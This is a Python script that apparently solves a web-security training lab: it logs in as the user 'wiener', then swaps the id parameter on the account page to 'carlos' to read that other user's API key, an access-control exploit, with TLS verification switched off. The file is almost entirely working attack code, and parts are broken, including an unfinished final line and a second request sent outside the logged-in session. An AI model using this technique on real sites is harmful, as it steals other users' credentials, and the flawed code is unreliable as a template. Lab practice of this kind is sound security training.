import sys
import requests
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(s,url):
    res = s.get(url,verify=False)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf = soup.find("input",{'name':'csrf'})['value']
    return csrf

def obtain_api(s,url):

    # step 1>logging in as wiener..
    login_site = "/login"
    for_login = {'csrf':get_csrf_token(s,url+login_site),'username':'wiener','password':'peter'}
    res = s.post(url+login_site,data=for_login,verify=False)

    if "Log out" in res.text:
        print("[+]login Successfull")
        print("[+] fetching the api key...")

        carlos_login = "/my-account?id=carlos"
        res = s.get(url+carlos_login,verify=False)
        api_key = re.search("Your API Key is:(.*)",res.text).group(1)
        print("[+] api_key is %s",api_key.split("</div><br/>")[0])

    else:
        print("[-]login failed")
        print("exiting...")
        sys.exit(-1)

    # step 2> changing request params as carlos
    for_carlos_login_site = "/my-account?id=carlos"
    res = requests.get(url+for_carlos_login_site,verify=False)

    if "carlos" in res.text:
        print("[+]login as carlos successfull ")
    else:
        print("[-]login as carlos failed")
        print("[-]exiting...")
        sys.exit(-1)
    
    #finding the api key..
    soup = BeautifulSoup


def main():
    if len(sys.argv) != 2:
        print("[+]usage:%s <url>"%sys.argv[0])
    
    print("obtaining api for carlos...")
    s = requests.Session()
    url = sys.argv[1]
    obtain_api(s,url)

if __name__ == "__main__":
    main()